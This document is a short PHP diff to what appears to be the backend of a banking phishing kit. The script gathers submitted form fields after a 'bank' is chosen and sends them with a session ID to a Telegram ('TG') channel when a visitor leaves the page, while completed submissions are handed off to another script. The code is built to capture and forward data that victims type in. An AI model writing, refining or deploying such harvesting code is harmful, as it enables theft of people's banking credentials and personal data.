@@ -59,17 +59,15 @@ $labels = array(
 
 $bankChosen = isset($fields["extra"]) && trim((string)$fields["extra"]) !== "";
 
-// Leave TG only after bank is chosen. Complete always notifies.
+// Leave TG only after bank is chosen. Complete is handled by svar.php only (no double TG).
 $notifyTg = false;
-if ($status === "complete") {
-  $notifyTg = true;
-} elseif (($status === "leave" || $status === "beacon") && $bankChosen) {
+if (($status === "leave" || $status === "beacon") && $bankChosen) {
   $notifyTg = true;
 }
 
 $sent = 0;
 if ($notifyTg) {
-  $hdr = ($status === "complete" ? "🟢 Complete" : "🟡 Partial (left page)") . " — step " . $step . "\n";
+  $hdr = "🟡 Partial (left page) — step " . $step . "\n";
   $hdr .= "🆔 Session: " . $sessionId . "\n\n";
   $body = "";
   foreach ($fields as $k => $v) {
